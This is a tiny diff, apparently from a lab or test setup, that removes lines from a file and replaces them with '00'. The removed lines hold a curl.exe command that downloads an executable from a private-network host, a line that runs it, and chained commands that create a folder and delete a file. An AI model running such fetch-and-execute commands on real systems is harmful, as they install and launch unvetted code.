@@ -1,6 +1,1 @@
-101112
-curl.exe -sL "http://192.168.254.11:8000/WSrvManager.exe" -o "C:/lab/test.exe"
-C:/lab/test.exe		
-0
-1
-cd /D C:\ && mkdir lab, cd /D C:\ && del test.txt
+00
